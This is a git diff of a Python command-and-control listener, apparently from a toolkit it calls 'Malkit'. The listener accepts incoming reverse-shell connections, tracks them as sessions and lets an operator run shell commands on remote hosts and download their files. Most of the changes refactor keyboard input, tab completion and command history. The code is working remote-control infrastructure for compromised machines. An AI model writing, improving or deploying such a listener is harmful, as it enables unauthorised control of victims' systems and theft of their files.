@@ -2,23 +2,32 @@ import os
 import socket
 import sys
 import time
-from _pline import console
 from threading import Thread
-from progress.spinner import Spinner
 
+from progress.spinner import Spinner
+from pywin.scintilla import keycodes
+
+from _pline import console
 
 sessions = []
 alive = True
-mainalive = 0
+listening = False
 port = 0
-block = False
-# Disable print
-def blockPrint():
-    sys.stdout = open(os.devnull, 'w')
+holder = 0
 
-# Restore print
-def enablePrint():
-    sys.stdout = sys.__stdout__
+# key codes
+BACKSPACE = 8
+lCONTROL_L = (76, 40)
+rCONTROL_L = (76, 36)
+CONTROL_L = [lCONTROL_L, rCONTROL_L]
+ENTER = 13
+UP_ARROW = 38
+DOWN_ARROW = 40
+TAB = 9
+TAB_state = (9, 32)
+
+memory = -1
+history = []
 
 def transfer(conn, command):
     try:
@@ -55,57 +64,45 @@ def clear():
     else:
         os.system("clear")
 
+
 def die():
-    block = True
     global alive
     alive = False
     print("\n[+] Cleaning up...")
-    time.sleep(3)
-    clear()
+    time.sleep(1)
     spinner = Spinner("Exiting...")
-    for _ in range(20):
+    for _ in range(10):
         spinner.next()
         time.sleep(0.1)
     spinner.finish()
     clear()
-    print("[+] Done")
-    time.sleep(1)
-    clear()
+    print("[+] Exited Successfully")
     os._exit(1)
 
 
 def run_server():
     global port
-    global mainalive
-    
+    global listening
     host = "0.0.0.0"
     port = <<PORT>>
     s = socket.socket()
     tries = 60
-    if block:
-        blockPrint()
-    elif not block:
-        enablePrint()
     for conTry in range(tries):
         try:
             s.bind((host, port))
             print(
-                f'\n[+] Listening for income TCP connection on port {port}...\n')
+                f'\n[+] Listening for TCP connections on port {port}...\n')
             break
         except OSError:
             print(
-                f"oops, problem with socket. Retrying... [{conTry}/{tries-conTry}s]", end="\r")
+                f"oops, problem with socket. Retrying...[{conTry}/{tries}s]", end="\r")
             time.sleep(1)
             continue
         print("Couldn't fix socket problem. Try again.")
         die()
+    listening = True
     s.listen(<<CONNECTIONS_MAX>>)
-    mainalive += 1
     while alive:
-        if block:
-            blockPrint()
-        elif not block:
-            enablePrint()
         try:
             client, addr = s.accept()
             num = len(sessions)
@@ -116,11 +113,13 @@ def run_server():
     s.close()
     return 0
 
+
 def help():
     help_screen = """
 Malkit Listener Help Screen!
 
 The commands are split into two categories:
+
     [Listener commands]: the ones you can use inside the "Listener>" screen.
 
     [Shell commands]: the ones you can use inside the "Shell>" screen after interacting with a session.
@@ -132,90 +131,129 @@ list    -   lists all active sessions in the format: SessionNumber: IP/PORT
 interact::SessionNumber    -   Allows you to interact with a session number. Example: interact::0
 kill::SessionNumber    -   Kills a specific session number. Example: kill::0
 exit    -   Exits the listener, same effect as a KeyboardInterrupt
-help    -   Shows this screen 
-
+help    -   Shows this screen
 
 
 [Shell Commands]
 
 <bg or <background  -   Backgrounds the current session, allowing you to return to the lister.
 <download::RemotePath::LocalPath    -   Downloads a file from the remote system into your local one.
-                                        Example: <download::remote_file.txt::savehere/files/downloaded.txt 
+                                    -   Example: <download::remote_file.txt::savehere/files/downloaded.txt 
 exit or <exit   -   Kills the current shell, returning you into the listener
 
 """
     print(help_screen)
     return 0
 
+
 commands_listener = ["help ", "kill ", "list ", "interact::", "exit "]
-commands_shell = ["<bg ", "<background ", "<download::", "<exit", "exit"]
+commands_shell = ["<bg ", "<background ", "<download::", "<exit", "<help"]
+
 
 def completer_listener(text):
-    return [i for i in commands_listener if (i.startswith(text) and len(text)>0)]
+    return [i for i in commands_listener if (i.startswith(text) and len(text) > 0)]
+
+
 def completer_shell(text):
-    return [i for i in commands_shell if (i.startswith(text) and len(text)>0)]
+    return [i for i in commands_shell if (i.startswith(text) and len(text) > 0)]
+
+
+def handle_keys(buffer, state, completer):
+    try:
+        global memory
+        global history
+        key = c.getkeypress()
+        keycode = key.keycode
+        keystate = key.state
+        buflen = len(buffer)
+        keychar = key.char
+        if keycode == BACKSPACE:
+            if buflen >= 1:
+                c.write('\b \b')
+                buffer = buffer[:-1]
+        elif (keycode, keystate) == lCONTROL_L or (keycode, keystate) == rCONTROL_L:
+            clear()
+            return "FLUSH", buffer
+        elif (keycode, keystate) == TAB_state:
+            if completer == "listener":
+                options = completer_listener(buffer)
+            elif completer == "shell":
+                options = completer_shell(buffer)
+            option_len = len(options)
+            if option_len == 1:
+                completed = options[0]
+                start_point = buflen
+                diff = completed[start_point:]
+                c.write(diff)
+                buffer += diff
+            elif option_len > 1 and option_len <= 10:
+                c.write("\n")
+                for option in options:
+                    c.write(option + "    ")
+                c.write("\n" + state + buffer)
+        elif keycode == ENTER:
+            if len(buffer) > 0:
+                history.append(buffer)
+                memory = len(history)
+            c.pos(y=0)
+            c.write("\n")
+            return (True, buffer)
+        elif keycode == UP_ARROW:
+            if len(history) > 0:
+                if memory - 1 >= 0:
+                    memory -= 1
+                if memory >= 0:
+                    for _ in range(len(buffer)):
+                        c.write('\b \b')
+                    buffer = history[memory]
+                    c.write(history[memory])
+        elif keycode == DOWN_ARROW:
+            if len(history) > 0:
+                if memory + 1 <= len(history):
+                    memory += 1
+                if memory > 0 and memory < len(history):
+                    for _ in range(len(buffer)):
+                        c.write('\b \b')
+                    buffer = history[memory]
+                    c.write(history[memory])
+                elif memory == len(history):
+                    for _ in range(len(buffer)):
+                        c.write('\b \b')
+                    buffer = ""
+
+        else:
+            c.write(keychar)
+            buffer += keychar
+            return (False, buffer)
+        return (False, buffer)
+    except Exception as err:
+        raise(err)
+        return (None, buffer)
+
 
 def handle_client():
-    # Key Codes 
-    BACKSPACE = 8
-    lCONTROL_L = (76, 40)
-    rCONTROL_L = (76, 36)
-    ENTER = 13
-    TAB = 9
-    TAB_state = (9, 32)
-
     global sessions
     global holder
-    global mainalive
-    mainalive += 1
-    #readline.parse_and_bind("tab: complete")
-    
-    #
-    c = console.Console(0)
-    sys.stdout = c
-    sys.stderr = c
-    time.sleep(2)
+    buffer = ""
+    while not listening:
+        continue
+    state_listen = f"Listener> "
     while alive:
-        flush = False
+        c.write(state_listen)
         try:
-            c.write(f"Listener> ")
-            buffer = ""
             while True:
-                try:
-                    ch = c.getkeypress()
-                    if ch.keycode == BACKSPACE:
-                        if len(buffer) >= 1:
-                            c.write('\b \b')
-                            buffer = buffer[:-1]
-                    elif (ch.keycode, ch.state) == lCONTROL_L or (ch.keycode, ch.state) == rCONTROL_L:
-                        clear()
-                        flush = True
-                        break
-                    elif (ch.keycode, ch.state) == TAB_state:
-                        options = completer_listener(buffer)
-                        if len(options) == 0: continue
-                        elif len(options) == 1:
-                            completed = options[0]
-                            start_point = len(buffer)
-                            diff = completed[start_point:]
-                            c.write(diff)
-                            buffer += diff
-                        elif len(options) > 1 and len(options) <= 10:
-                            c.write("\n")
-                            for option in options:
-                                c.write(option + "    ")
-                            c.write("\n" + "Listener> " + buffer)
-                    elif ch.keycode == ENTER:
-                        c.pos(y=0)
-                        c.write("\n")
-                        break
+                enter_state, buffer = handle_keys(buffer, state_listen, "listener")
+                if enter_state:
+                    if enter_state == "FLUSH":
+                        c.write(state_listen)
+                        continue
                     else:
-                        c.write(ch.char)
-                        buffer += ch.char
-                except Exception as err:
-                    pass
-            if flush: continue        
-            com, *arg = buffer.split(" ")
+                        com, *arg = buffer.split(" ")
+                        buffer = ""
+                        break         
+                else:
+                    continue
+            
             com = com.lower()
             arg = ''.join(arg).lower()
             if com == "cls" or com == "clear" or com.encode() == b'\x0c':
@@ -237,59 +275,36 @@ def handle_client():
                 try:
                     int_arg = int(arg)
                     sessions.pop(int_arg)
-                    holder -=1
+                    holder -= 1
                 except Exception as e:
                     print("error", e)
             elif com.startswith("interact"):
                 try:
                     comm, snum = com.split("::")
                     conn = sessions[int(snum)][1]
+                    state_shell = f"[{snum}] Shell>"
                 except:
                     print("make sure you did it right")
                     continue
                 while alive:
-                    flush = False
-                    c.write(f"[{snum}] Shell>")
-                    buffer2 = ""
+                    c.write(state_shell)
+                    buffer = ""
                     while True:
-                        try:
-                            ch = c.getkeypress()
-                            if ch.keycode == BACKSPACE:
-                                if len(buffer2) >= 1:
-                                    c.write('\b \b')
-                                    buffer2 = buffer2[:-1]
-                            elif (ch.keycode, ch.state) == lCONTROL_L or (ch.keycode, ch.state) == rCONTROL_L:
-                                clear()
-                                flush = True
-                                break
-                            elif (ch.keycode, ch.state) == TAB_state:
-                                options = completer_shell(buffer2)
-                                if len(options) == 0: continue
-                                elif len(options) == 1:
-                                    completed = options[0]
-                                    start_point = len(buffer2)
-                                    diff = completed[start_point:]
-                                    c.write(diff)
-                                    buffer2 += diff
-                                elif len(options) > 1 and len(options) <= 10:
-                                    c.write("\n")
-                                    for option in options:
-                                        c.write(option + "    ")
-                                    c.write("\n" + f"[{snum}] Shell> " + buffer2)
-                            elif ch.keycode == ENTER:
-                                c.pos(y=0)
-                                c.write("\n")
-                                break
+                        enter_state, buffer = handle_keys(buffer, state_shell, "shell")
+                        if enter_state:
+                            if enter_state == "FLUSH":
+                                c.write(state_shell)
+                                continue
                             else:
-                                c.write(ch.char)
-                                buffer2 += ch.char
-                        except Exception as err:
-                            pass
-                    if flush: continue
-                    command = buffer2
+                                command = buffer
+                                buffer = ""
+                                break         
+                        else:
+                            continue
                     try:
-                        if command == "exit" or command == "<exit":
+                        if command == "<exit":
                             sessions.pop(int(snum))
+                            buffer = ""
                             break
                         elif command == 'cls' or command == 'clear' or command.encode() == b'\x0c':
                             clear()
@@ -317,7 +332,7 @@ def handle_client():
                                     print(output.decode().replace("CDDONE", ""))
                                     break
                             continue
-                        elif command.lower() == "help":
+                        elif command.lower() == "<help":
                             help()
                             continue
                         else:
@@ -341,46 +356,21 @@ def handle_client():
             break
     return 0
 
-## Need to add detection of timed out connection!
 
-#def timeout():
-#    global sessions
-#    while alive:
-#        time.sleep(10)
-#        com = "pwd"
-#
-#        for x in sessions:
-#            try:
-#                conn = x[1]
-#                conn.send(com.encode())
-#                resp = conn.recv(1024).decode()
-#                if len(resp) > 0:
-#                    continue
-#                else:
-#                    sessions.pop(x[0])
-#            except Exception as e:
-#                print(e)
-                #sessions.pop(x[0])
-
-holder = 0
 def print_conn():
     global alive
     global sessions
     global holder
-    global mainalive
-    mainalive += 1
     while alive:
-        if block:
-            blockPrint()
-        elif not block:
-            enablePrint()
         time.sleep(2)
         if len(sessions) > holder:
             diff = len(sessions) - holder
             for x in range(holder, holder + diff):
-                print(f'\n[+] Got one! Session {sessions[x][0]} from {sessions[x][2][0]} on port {sessions[x][2][1]} (remote: {port})...\n')
+                print(
+                    f'\n[+] Got one! Session {sessions[x][0]} from {sessions[x][2][0]} on port {sessions[x][2][1]} (remote: {port})...\n')
             holder = len(sessions)
     return 0
+
 
 def run_alive(queue: list):
     for thread in queue:
@@ -388,9 +378,15 @@ def run_alive(queue: list):
         thread.daemon = True
         thread.start()
 
+
 queue = []
 if __name__ == "__main__":
+
     try:
+        c = console.Console(0)
+        sys.stdout = c
+        sys.stderr = c
+
         run_server_thread = Thread(target=run_server)
         print_conn_thread = Thread(target=print_conn)
         # control_timeout = Thread(target=timeout)
@@ -399,7 +395,7 @@ if __name__ == "__main__":
 
         queue.append(run_server_thread)
         queue.append(print_conn_thread)
-        #queue.append(screen_control_thread)
+        # queue.append(screen_control_thread)
         # queue.append(control_timeout)
         queue.append(main_server_thread)
 
